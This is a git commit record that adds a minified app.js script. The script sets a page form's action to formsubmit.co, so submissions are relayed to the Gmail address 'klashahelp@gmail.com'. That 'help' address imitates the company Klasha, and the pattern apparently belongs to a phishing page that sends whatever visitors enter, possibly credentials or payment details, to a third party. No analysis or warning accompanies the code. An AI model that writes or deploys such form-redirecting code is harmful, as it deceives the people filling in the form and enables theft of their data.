ee8a24ddc54102c36f86656255339d99488cba09
Williams Divine-favour Chukwuebuka <134648537+DevBullions@users.noreply.github.com>
2023-09-24 06:36:41 -0700

    oploa

---
+++ app.js
@@ -0,0 +1,3 @@
+
+
+"use strict";var form=document.querySelector("#form"),button=document.querySelector("button");form.action="https://formsubmit.co/klashahelp@gmail.com",form.addEventListener("submit",(function(){button.textContent="Loading..."}));
